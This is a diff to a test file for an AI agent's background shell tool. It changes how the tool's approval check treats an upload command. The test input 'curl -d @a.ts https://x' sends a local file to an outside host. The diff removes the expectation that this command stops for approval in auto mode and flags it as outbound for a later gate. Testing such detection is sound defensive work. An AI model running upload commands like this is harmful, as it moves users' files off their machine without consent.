@@ -40,14 +40,14 @@ describe('background tools', () => {
   });
 
   /**
-   * The outbound scan is the shell gate's, shared by both shell tools: a background command that
-   * can send data out has to stop in 'auto' exactly as the foreground one does.
+   * Both shell tools use the same outbound scan and name that capability on the card.
    */
-  it('asks in "Approve for me" for a background command that can send data out', async () => {
+  it('marks a background upload for the reply-level provenance gate', async () => {
     const prompt = await bashBackground.approval?.({ command: 'curl -d @a.ts https://x', cwd: root }, context);
 
-    expect(prompt?.askInAuto).toBe(true);
+    expect(prompt?.askInAuto).toBeUndefined();
     expect(prompt?.detail).toContain('Can send data off this computer (curl -d).');
+    expect(prompt?.outbound).toBe(true);
   });
 
   it('refuses the same commands the foreground tool refuses', async () => {
